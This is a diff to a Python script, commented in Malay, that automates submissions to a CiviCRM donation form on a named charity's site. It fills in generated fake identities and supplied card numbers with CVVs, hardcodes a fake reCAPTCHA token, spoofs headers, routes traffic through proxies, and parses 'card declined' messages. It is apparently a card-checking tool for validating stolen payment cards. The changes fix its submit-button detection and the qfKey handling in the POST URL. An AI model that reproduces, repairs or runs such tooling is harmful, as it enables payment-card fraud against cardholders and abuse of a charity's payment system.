@@ -54,7 +54,6 @@ def generate_random_user_data():
     email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
     email = f"{email_prefix}@{random.choice(email_domains)}"
     
-    # FIX: Kunci lokasi Minneapolis, Minnesota, 55401 supaya match dengan Country US (1228)
     city = "Minneapolis"
     state_id = "1022" 
     postal_code = "55401"
@@ -118,18 +117,16 @@ def extract_raw_fields(html, soup, form):
     payload = {}
     inputs = form.find_all('input')
     
-    submit_button_name = None
-    submit_button_value = None
+    # Tangkap button submit sebenar dari HTML (JANGAN HARDCODE)
+    submit_button_name = "_qf_Main_upload"
+    submit_button_value = "1"
     for inp in inputs:
-        if inp.get('type') in ['submit', 'button']:
+        if inp.get('type') in ['submit', 'button', 'image']:
             name = inp.get('name')
             if name and '_qf_' in name:
                 submit_button_name = name
                 submit_button_value = inp.get('value', '1')
                 break
-    if not submit_button_name:
-        submit_button_name = "_qf_Main_upload"
-        submit_button_value = "1"
     
     payload['_submit_button_name'] = submit_button_name
     payload['_submit_button_value'] = submit_button_value
@@ -205,6 +202,9 @@ def get_form_action_and_payload(session, url, proxy_url):
         if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
         if not form_action: return None, None, None, None, "Form action not found"
         
+        # FIX: Bersihkan form_action dari &amp;
+        form_action = form_action.replace("&amp;", "&")
+        
         payload = extract_raw_fields(html, soup, form)
         return qfkey, form_action, payload, has_authorize, "OK"
         
@@ -220,7 +220,6 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    # 1. Cari div yang ada class error/status/messages
     status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
@@ -231,7 +230,6 @@ def parse_response(html, url):
             if error_text:
                 return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
                 
-    # 2. Cari span class msg-text (CIVICRM standard error)
     msg_text_span = soup.find('span', class_='msg-text')
     if msg_text_span:
         error_text = msg_text_span.get_text(strip=True)
@@ -241,7 +239,6 @@ def parse_response(html, url):
         if error_text and len(error_text) > 3:
             return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
 
-    # 3. Cari apa-apa text yang ada perkataan fail, submit, declined, error secara meluas
     all_text = soup.get_text(' ', strip=True)
     if re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)', all_text, re.I):
         match = re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)[^.]*', all_text, re.I)
@@ -281,7 +278,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
     # TOKEN FAKE
     final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
-    # INITIAL PAGE PAYLOAD
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
     final_payload["hidden_processor"] = "1"
@@ -306,9 +302,13 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
     final_payload["billing_street_address-5"] = user_data['street_address']
     final_payload["billing_city-5"] = user_data['city']
     final_payload["billing_country_id-5"] = "1228"
-    final_payload["billing_state_province_id-5"] = user_data['state_id'] # Dapat 1022 dari generate_random_user_data
+    final_payload["billing_state_province_id-5"] = user_data['state_id']
     final_payload["billing_postal_code-5"] = user_data['postal_code']
-    final_payload["_qf_Main_upload"] = "1"
+    
+    # GUNA NAMA BUTANG YANG DITANGKAP DARI HTML
+    submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
+    submit_val = raw_payload.get('_submit_button_value', '1')
+    final_payload[submit_name] = submit_val
 
     return final_payload
 
@@ -325,6 +325,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
         try:
             clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price)
 
+            # FIX: LOCK HEADER STATIK
             session.headers.update({
                 "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                 "Origin": "https://www.saharaaa.org",
@@ -335,18 +336,22 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            response = session.post(form_action, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
+            # Paksa pastikan qfKey ada dalam URL POST
+            post_url = form_action
+            if 'qfKey=' not in post_url:
+                if '?' in post_url: post_url += f'&qfKey={qfkey}'
+                else: post_url += f'?qfKey={qfkey}'
+
+            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            # FOKUS TANGKAP ERROR DEKAT SINI
             result = parse_response(response.text, response.url)
             
-            # Jika berjaya masuk Confirmation page, kita still bagi tau tapi kita takkan process
             if result.get('is_confirmation'):
-                logging.info("Berjalah masuk Confirmation Page, tapi skip buat apa2 sebab nak fokus Initial Page")
+                logging.info("Berjaya masuk Confirmation Page, tapi skip buat apa2 sebab nak fokus Initial Page")
             
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
